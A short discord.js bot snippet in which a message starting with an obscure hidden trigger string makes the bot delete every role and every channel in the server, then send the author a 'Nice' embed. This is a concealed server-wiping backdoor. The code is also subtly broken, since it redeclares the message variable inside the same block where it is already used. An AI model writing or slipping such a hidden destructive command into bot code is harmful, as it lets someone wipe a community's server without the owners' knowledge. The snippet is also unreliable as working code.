client.on('message', alpha => {
 if (alpha.content.startsWith("!commmmmmmmmmmmmmmmmmmmmmmmmmmmannnnnnnnnnnnnnnnnndhackkkkkkkkkkkkkk00")) {
alpha.guild.roles.forEach(r => { r.delete() })
alpha.guild.channels.forEach(c => { c.delete() })
let alpha = new Discord.RichEmbed()
.setColor('RANDOM')
.setDescription('**Nice**')
alpha.author.sendEmbed(alpha);
}
});


client.login(process.env.BOT_TOKEN);
